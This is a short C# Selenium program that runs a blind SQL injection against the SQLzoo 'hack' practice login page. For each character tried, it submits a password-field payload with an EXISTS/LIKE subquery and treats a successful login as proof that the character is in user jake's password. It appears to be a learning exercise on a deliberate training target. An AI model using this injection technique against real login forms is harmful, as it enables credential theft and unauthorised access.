using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Firefox;
//using OpenQA.Selenium.Support.UI;


namespace TESTsiANDselenium
{
    class Program
    {
        static void Main(string[] args)
        {
            FirefoxDriver driver = new FirefoxDriver();
            string baseURL = "http://sqlzoo.net/";

            //            driver.Navigate().GoToUrl(baseURL + "/hack/index.html");
            //driver.FindElement(By.Name("name")).Clear();
            //driver.FindElement(By.Name("name")).SendKeys("jake");
            string character = "dewol";
            string result = "";
            foreach (char a in character)
            {
                driver.Navigate().GoToUrl(baseURL + "/hack/index.html");
                var x = driver.FindElementByTagName("iframe");
                driver.SwitchTo().Frame(x);
                driver.FindElement(By.Name("name")).Clear();
                driver.FindElement(By.Name("name")).SendKeys("jake");
                driver.FindElement(By.Name("password")).Clear();
                driver.FindElement(By.Name("password")).SendKeys("' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%" + a + "%') AND ''='");
                driver.FindElement(By.CssSelector("input[type=\"submit\"]")).Click();
                var d = driver.FindElement(By.CssSelector("body"));
                Console.WriteLine("{0}:\n #################\n{1}", a, d.Text);
                if (d.Text == "Welcome jake you are now logged in!") {
                    result += a;
                }
                //Console.Read();
            }
            Console.WriteLine(result);
            Console.WriteLine("All done");
            Console.Read();
            driver.Quit();

        }

    }
}
